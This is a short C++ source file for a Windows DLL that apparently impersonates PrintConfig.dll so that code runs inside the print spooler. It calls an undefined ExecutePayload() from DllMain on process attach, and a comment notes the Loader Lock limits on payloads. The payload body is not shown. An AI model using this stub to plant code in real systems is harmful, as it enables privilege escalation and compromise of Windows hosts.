// dllmain.cpp : Defines the entry point for the DLL application.
#include <windows.h>

// PrintConfig.dll doesn't export any functions (does it implement any functions that get called on a print job?) so we have to execute our payload in DllMain so our choice of payloads is restricted because of the Loader Lock
// See: https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-best-practices

void ExecutePayload();

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		ExecutePayload();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

